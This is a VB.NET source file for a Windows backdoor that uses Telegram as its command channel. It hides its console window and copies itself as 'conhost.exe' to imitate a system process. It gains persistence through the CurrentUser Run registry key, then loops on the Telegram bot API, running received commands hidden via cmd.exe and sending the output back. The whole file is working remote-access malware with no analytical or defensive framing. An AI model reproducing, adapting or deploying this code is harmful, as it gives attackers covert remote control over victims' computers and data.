Imports System
Imports System.Net.Http
Imports System.Text.Json
Imports System.Diagnostics
Imports System.Text
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.IO
Imports Microsoft.Win32
Imports System.Security.Principal
Imports System.Runtime.Versioning

Module Module1
    Private ReadOnly client As New HttpClient()
    Private Const token As String = "0000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    Private Const chatId As Long = 0000000000
    Private Const exeName As String = "conhost.exe"

    <DllImport("kernel32.dll")>
    Private Function AllocConsole() As Boolean
    End Function

    <DllImport("kernel32.dll")>
    Private Function FreeConsole() As Boolean
    End Function

    Sub Main()
        FreeConsole()
        Dim targetDir As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "console")
        Dim currentExePath As String = Process.GetCurrentProcess().MainModule.FileName
        Dim targetExePath As String = Path.Combine(targetDir, exeName)
        Try
            If Not String.Equals(currentExePath, targetExePath, StringComparison.OrdinalIgnoreCase) Then
                If IsRunningAsAdmin() Then
                    If Not Directory.Exists(targetDir) Then
                        Try
                            Directory.CreateDirectory(targetDir)
                        Catch ex As Exception

                        End Try
                    End If
                    If Directory.Exists(targetDir) Then
                        Dim currentDir As String = Path.GetDirectoryName(currentExePath)
                        For Each filePath As String In Directory.GetFiles(currentDir)
                            Dim fileName As String = Path.GetFileName(filePath)
                            Dim destFile As String = Path.Combine(targetDir, fileName)
                            Try
                                File.Copy(filePath, destFile, True)
                            Catch ex As Exception

                            End Try
                        Next
                        If File.Exists(targetExePath) Then
                            If Not IsInStartup() Then
                                Try
                                    AddToStartup(targetExePath)
                                Catch ex As Exception

                                End Try
                            End If
                        Else

                        End If
                    End If
                Else

                End If
            End If
        Catch ex As Exception

        End Try
        Dim offset As Long = 0
        While True
            Try
                Dim url As String = $"https://api.telegram.org/bot{token}/getUpdates?offset={offset}&timeout=30"
                Dim response As String = client.GetStringAsync(url).Result
                Dim jsonDoc As JsonDocument = JsonDocument.Parse(response)
                Dim root As JsonElement = jsonDoc.RootElement
                If Not root.GetProperty("ok").GetBoolean() Then
                    Continue While
                End If
                Dim results As JsonElement = root.GetProperty("result")
                For Each update In results.EnumerateArray()
                    Dim updateId As Long = update.GetProperty("update_id").GetInt64()
                    offset = updateId + 1
                    Dim messageElem As JsonElement
                    If update.TryGetProperty("message", messageElem) Then
                        Dim chat As JsonElement = messageElem.GetProperty("chat")
                        Dim thisChatId As Long = chat.GetProperty("id").GetInt64()
                        If thisChatId = chatId Then
                            Dim text As String = messageElem.GetProperty("text").GetString()
                            If text.StartsWith("-") Then
                                Dim command As String = text.Substring(1).ToUpper()
                                Dim output As String = ExecuteCmdCommand(command)
                                SendTelegramMessage(output)
                            End If
                        End If
                    End If
                Next
            Catch ex As HttpRequestException
                System.Threading.Thread.Sleep(5000)
            Catch ex As JsonException
                System.Threading.Thread.Sleep(5000)
            Catch ex As Exception
                System.Threading.Thread.Sleep(5000)
            End Try
        End While
    End Sub

    Private Function ExecuteCmdCommand(command As String) As String
        Try
            Dim processInfo As New ProcessStartInfo("cmd.exe")
            processInfo.Arguments = $"/c {command}"
            processInfo.RedirectStandardOutput = True
            processInfo.RedirectStandardError = True
            processInfo.UseShellExecute = False
            processInfo.CreateNoWindow = True
            Using process As Process = Process.Start(processInfo)
                Dim output As String = process.StandardOutput.ReadToEnd()
                Dim errorOutput As String = process.StandardError.ReadToEnd()
                process.WaitForExit()
                If process.ExitCode = 0 Then
                    Return output
                Else
                    Return $"Erro ao executar '{command}': {errorOutput}"
                End If
            End Using
        Catch ex As Exception
            Return $"Erro ao executar '{command}': {ex.Message}"
        End Try
    End Function

    Private Sub SendTelegramMessage(message As String)
        Try
            message = Uri.EscapeDataString(message)
            Dim url As String = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={message}"
            Dim response As String = client.GetStringAsync(url).Result
            Dim jsonDoc As JsonDocument = JsonDocument.Parse(response)
            Dim root As JsonElement = jsonDoc.RootElement
            If Not root.GetProperty("ok").GetBoolean() Then
            End If
        Catch ex As Exception
        End Try
    End Sub

    <SupportedOSPlatform("windows")>
    Private Sub AddToStartup(exePath As String)
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            regKey.SetValue("conhost", exePath)
            regKey.Close()
        Catch ex As Exception
            Throw New Exception($"Falha ao adicionar ao Registro: {ex.Message}")
        End Try
    End Sub

    <SupportedOSPlatform("windows")>
    Private Function IsInStartup() As Boolean
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", False)
            Dim value As String = regKey.GetValue("conhost")
            regKey.Close()
            Return value IsNot Nothing
        Catch
            Return False
        End Try
    End Function

    <SupportedOSPlatform("windows")>
    Private Function IsRunningAsAdmin() As Boolean
        Try
            Dim identity As WindowsIdentity = WindowsIdentity.GetCurrent()
            Dim principal As New WindowsPrincipal(identity)
            Return principal.IsInRole(WindowsBuiltInRole.Administrator)
        Catch
            Return False
        End Try
    End Function
End Module